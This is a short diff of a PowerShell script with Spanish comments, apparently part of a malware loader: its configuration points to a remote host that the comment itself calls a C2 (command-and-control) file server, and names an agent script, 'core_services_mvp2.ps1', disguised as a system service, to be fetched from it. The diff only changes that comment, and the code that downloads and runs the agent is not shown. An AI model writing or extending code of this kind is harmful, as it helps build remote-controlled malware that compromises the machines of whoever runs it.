@@ -15,7 +15,7 @@ if (Test-Path $flagFilePath) {
 # ----------------------------------------------------
 
 # --- CONFIGURACIÓN ---
-$staticFilesBaseUrl = "https://exa-sw-fr2c.onrender.com/files" # Ej. "https://mi-c2-files.onrender.com/files"
+$staticFilesBaseUrl = "https://exa-sw-fr2c.onrender.com/files" # URL actualizada del servidor C2/archivos
 $agentFileNameOnServer = "core_services_mvp2.ps1" 
 # --------------------
 
